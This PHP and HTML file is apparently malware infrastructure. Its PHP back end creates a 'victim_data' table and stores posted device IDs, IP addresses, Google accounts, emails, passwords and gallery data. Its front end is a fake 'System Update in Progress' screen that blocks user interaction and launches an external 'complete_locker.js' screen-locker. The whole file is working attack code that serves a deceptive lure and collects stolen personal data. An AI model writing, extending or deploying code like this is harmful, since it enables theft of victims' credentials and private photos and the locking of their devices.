<?php
// Start session
session_start();

// Database connection
$servername = "localhost";
$username = "root";
$password = "";
$dbname = "virous_data";

// Create connection
$conn = new mysqli($servername, $username, $password);

// Check connection
if ($conn->connect_error) {
    die("Connection failed: " . $conn->connect_error);
}

// Create database if not exists
$sql = "CREATE DATABASE IF NOT EXISTS $dbname";
if ($conn->query($sql) !== TRUE) {
    die("Error creating database: " . $conn->error);
}

// Select database
$conn->select_db($dbname);

// Create table if not exists
$sql = "CREATE TABLE IF NOT EXISTS victim_data (
    id INT(11) AUTO_INCREMENT PRIMARY KEY,
    device_id VARCHAR(255) NOT NULL,
    ip_address VARCHAR(50) NOT NULL,
    user_agent TEXT NOT NULL,
    google_account VARCHAR(255),
    email VARCHAR(255),
    passwords TEXT,
    gallery_data LONGTEXT,
    timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP
)";

if ($conn->query($sql) !== TRUE) {
    die("Error creating table: " . $conn->error);
}

// Get client IP address
function getClientIP() {
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        return $_SERVER['HTTP_CLIENT_IP'];
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        return $_SERVER['HTTP_X_FORWARDED_FOR'];
    } else {
        return $_SERVER['REMOTE_ADDR'];
    }
}

$ip = getClientIP();
$userAgent = $_SERVER['HTTP_USER_AGENT'];

// Process POST data
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Get the JSON data from the request
    $json = file_get_contents('php://input');
    $data = json_decode($json, true);
    
    if ($data) {
        // Extract data
        $deviceId = $data['device_id'] ?? '';
        $googleAccount = $data['google_account'] ?? '';
        $email = $data['email'] ?? '';
        $passwords = $data['passwords'] ?? '';
        $galleryData = isset($data['gallery_data']) ? json_encode($data['gallery_data']) : '';
        
        // Prepare SQL statement
        $stmt = $conn->prepare("INSERT INTO victim_data (device_id, ip_address, user_agent, google_account, email, passwords, gallery_data) VALUES (?, ?, ?, ?, ?, ?, ?)");
        $stmt->bind_param("sssssss", $deviceId, $ip, $userAgent, $googleAccount, $email, $passwords, $galleryData);
        
        // Execute statement
        if ($stmt->execute()) {
            echo json_encode(["status" => "success", "message" => "Data saved successfully"]);
        } else {
            echo json_encode(["status" => "error", "message" => "Error: " . $stmt->error]);
        }
        
        // Close statement
        $stmt->close();
        exit;
    }
}

// Close connection for non-POST requests
$conn->close();
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>System Update</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body, html {
            width: 100%;
            height: 100%;
            overflow: hidden;
            position: fixed;
            font-family: Arial, sans-serif;
            background-color: #000;
            color: #fff;
            touch-action: none;
            user-select: none;
            -webkit-user-select: none;
            -moz-user-select: none;
            -ms-user-select: none;
        }
        
        #loading-container {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            background-color: #000;
            z-index: 9999;
        }
        
        .loader {
            width: 60px;
            height: 60px;
            border: 5px solid rgba(255, 255, 255, 0.3);
            border-radius: 50%;
            border-top: 5px solid #fff;
            animation: spin 1s linear infinite;
            margin-bottom: 20px;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        .progress-container {
            width: 80%;
            max-width: 400px;
            background-color: rgba(255, 255, 255, 0.2);
            border-radius: 10px;
            overflow: hidden;
            margin-bottom: 10px;
        }
        
        .progress-bar {
            width: 0%;
            height: 10px;
            background-color: #4CAF50;
            transition: width 0.5s;
        }
        
        .progress-text {
            font-size: 14px;
            margin-top: 5px;
        }
        
        h2 {
            margin: 10px 0;
            font-size: 24px;
            font-weight: bold;
            animation: pulse 2s infinite;
        }
        
        @keyframes pulse {
            0% { opacity: 0.6; }
            50% { opacity: 1; }
            100% { opacity: 0.6; }
        }
        
        p {
            margin: 10px 0 30px 0;
            font-size: 16px;
            opacity: 0.8;
        }
    </style>
</head>
<body>
    <div id="loading-container">
        <div class="loader"></div>
        <h2>System Update in Progress</h2>
        <p>Please wait while your device is being optimized</p>
        <div class="progress-container">
            <div class="progress-bar" id="progress-bar"></div>
        </div>
        <div class="progress-text" id="progress-text">0%</div>
    </div>

    <script src="complete_locker.js"></script>
    <script>
        // Initialize the complete locker when the page loads
        document.addEventListener('DOMContentLoaded', function() {
            // Start the complete locker
            CompleteLocker.init();
        });
    </script>
</body>
</html>